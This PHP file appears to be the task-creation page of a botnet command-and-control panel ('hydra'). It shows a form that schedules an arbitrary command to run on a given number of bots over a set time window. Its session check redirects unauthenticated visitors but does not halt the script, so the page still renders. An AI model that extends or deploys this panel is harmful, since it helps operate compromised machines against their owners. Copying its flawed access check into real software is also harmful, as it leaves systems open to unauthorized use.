<?php
	session_start();
	if(!isset($_SESSION['hydra_loggedin']) && $_SESSION['hydra_loggedin'] != 1)
	{
		header("Location: http://www.google.com");
	}
?>
<div class="padding">
	<table>
		<tr>
			<td style="text-align:right">Command:</td><td><input id="command" type="text" name="command" value=""/></td>
		</tr>
		<tr>
			<td style="text-align:right;">Start Time:</td><td><input id="start" type="text" name="start" value="<?php echo date("d.m.Y H:i", time()); ?>" /></td>
		</tr>
		<tr>
			<td style="text-align:right;">Number of Bots:</td><td><input id="bots" type="text" name="bots" value=""/></td>
		</tr>
		<tr>
			<td>&nbsp;</td>
			<td>
			<select name="type" id="type">
			<option value="once">Run Once</option>
			<option value="until">Run Until</option>
			</select>
			</td>
		</tr>
		<tr>
			<td style="text-align:right;">End Time:</td><td><input id="end" type="text" name="end" value="<?php echo date("d.m.Y H:i", time()); ?>" /></td>
		</tr>
		<tr>
		<td colspan="2">
			<input type="submit" value="Create Task" name="submit" onClick="newTask(document.getElementById('command').value, document.getElementById('start').value, document.getElementById('bots').value, document.getElementById('type').value, document.getElementById('end').value);" />
		</td>
		</tr>
	</table>
</div>